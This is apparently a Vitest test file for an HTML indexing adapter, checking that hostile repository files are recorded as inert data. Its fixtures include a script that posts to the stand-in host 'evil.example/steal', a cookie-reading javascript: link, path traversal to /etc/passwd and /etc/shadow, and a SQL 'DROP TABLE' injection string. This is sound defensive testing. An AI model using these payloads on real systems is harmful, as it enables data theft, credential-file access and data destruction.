import { describe, expect, it } from 'vitest';

import { createHtmlAdapter } from './html-adapter.js';

import type { IndexingContext, RepositoryFile } from '../types.js';

// PRD §42.5 — repository content is untrusted, and an HTML document is the format most likely to
// carry hostile strings on purpose. A hostile `.html` file may at worst produce a wrong fact; it
// may never execute anything, reach a path outside the repository, or end the run.

const CONTEXT: IndexingContext = {
  repositorySnapshotId: 'snap-hostile',
  analysisRunId: 'run-hostile',
  createdAt: '2026-08-02T09:00:00.000Z',
};

const CONTROL: RepositoryFile = {
  relativePath: 'public/control.html',
  content: '<html><body><script src="./control.js"></script></body></html>\n',
};

const HOSTILE: readonly RepositoryFile[] = [
  {
    // Inline script content is text and stays text — nothing here evaluates a document.
    relativePath: 'public/exec.html',
    content:
      '<script>fetch("http://evil.example/steal", {method:"POST"})</script>\n<a href="javascript:alert(document.cookie)">go</a>\n',
  },
  {
    relativePath: 'public/traversal.html',
    content:
      '<link rel="stylesheet" href="../../../../../../etc/passwd" />\n<img src="../../../../etc/shadow" />\n',
  },
  {
    relativePath: 'public/broken.html',
    content: '<div><span></div></span><<<>\n<form action=\n',
  },
  {
    relativePath: 'public/-looks-like-a-flag.html',
    content: '<a href="/deals">deals</a>\n',
  },
  {
    relativePath: 'public/deep.html',
    content: `${'<div>'.repeat(400)}x${'</div>'.repeat(400)}\n`,
  },
  {
    relativePath: 'public/injection.html',
    content: '<form method="\'; DROP TABLE deals; --" action="\'; DROP TABLE deals; --"></form>\n',
  },
  {
    relativePath: 'public/name with spaces.html',
    content: '<a href="/ok">ok</a>\n',
  },
];

const indexHostile = () => createHtmlAdapter().indexFiles([...HOSTILE, CONTROL], CONTEXT);

describe('HTML adapter against hostile content (PRD §42.5, §34)', () => {
  it('indexes hostile files without throwing and never loses the control file', async () => {
    const fragment = await indexHostile();
    expect(fragment.nodes.some((node) => node.id === `file:${CONTROL.relativePath}`)).toBe(true);
    for (const file of HOSTILE) {
      const indexed = fragment.nodes.some((node) => node.id === `file:${file.relativePath}`);
      const warned = fragment.warnings.some((warning) => warning.filePath === file.relativePath);
      expect(indexed || warned, `${file.relativePath} produced neither a fact nor a warning`).toBe(
        true,
      );
    }
  });

  it('records a hostile href as data and never as a graph edge', async () => {
    const scripts = HOSTILE[0] as RepositoryFile;
    const fragment = await createHtmlAdapter().indexFiles([scripts], CONTEXT);
    expect(fragment.callFacts.flatMap((fact) => [...fact.stringArguments])).toContain(
      'javascript:alert(document.cookie)',
    );
    // The only node an HTML document ever produces is its own file node (PRD §30).
    expect(fragment.nodes.map((node) => node.type)).toEqual(['file']);
    expect(fragment.edges).toEqual([]);
  });

  it('never turns a climbing path into a reference outside the repository', async () => {
    const traversal = HOSTILE[1] as RepositoryFile;
    const fragment = await createHtmlAdapter().indexFiles([traversal], CONTEXT);
    // Recorded as specifiers, resolved only against the scanned file set — `/etc/passwd` is not
    // in it, so assembly produces no edge and this adapter opens nothing.
    expect(fragment.imports.map((reference) => reference.specifier)).toEqual([
      '../../../../../../etc/passwd',
      '../../../../etc/shadow',
    ]);
    expect(fragment.edges).toEqual([]);
  });

  it('reports unparseable markup as a warning rather than a failure', async () => {
    const broken = HOSTILE[2] as RepositoryFile;
    const fragment = await createHtmlAdapter().indexFiles([broken], CONTEXT);
    expect(fragment.warnings.map((warning) => warning.message).join(' ')).toContain(
      'parsed with error recovery',
    );
    expect(fragment.warnings.every((warning) => warning.adapterId === 'html')).toBe(true);
  });

  it('keeps an injection payload as a verbatim string, method included', async () => {
    const injection = HOSTILE[5] as RepositoryFile;
    const fragment = await createHtmlAdapter().indexFiles([injection], CONTEXT);
    const fact = fragment.callFacts[0];
    expect(fact?.stringArguments).toEqual(["'; DROP TABLE deals; --"]);
    expect(fact?.keywordStringArguments).toEqual({ method: "'; DROP TABLE DEALS; --" });
  });

  it('produces identical output for the same hostile input twice', async () => {
    expect(JSON.stringify(await indexHostile())).toBe(JSON.stringify(await indexHostile()));
  });
});

describe('HTML relationship scope (PRD §30)', () => {
  it('separates repository files from routes and external URLs', async () => {
    const fragment = await createHtmlAdapter().indexFiles(
      [
        {
          relativePath: 'public/index.html',
          content: [
            '<link rel="stylesheet" href="./site.css" />',
            '<script src="scripts/app.js"></script>',
            '<script src="https://cdn.example.com/a.js"></script>',
            '<a href="/deals">deals</a>',
            '<a href="./about.html">about</a>',
            '<form method="post" action="/api/deals"></form>',
          ].join('\n'),
        },
      ],
      CONTEXT,
    );
    expect(fragment.imports.map((reference) => reference.specifier)).toEqual([
      './site.css',
      './scripts/app.js',
    ]);
    expect(
      fragment.callFacts.map(
        (fact) => `${fact.calleeName}=${fact.stringArguments[0] ?? ''}${methodOf(fact)}`,
      ),
    ).toEqual([
      'script.src=https://cdn.example.com/a.js',
      'a.href=/deals',
      'a.href=./about.html',
      'form.action=/api/deals [POST]',
    ]);
  });
});

const methodOf = (fact: { keywordStringArguments?: Readonly<Record<string, string>> }): string => {
  const method = fact.keywordStringArguments?.['method'];
  return method === undefined ? '' : ` [${method}]`;
};
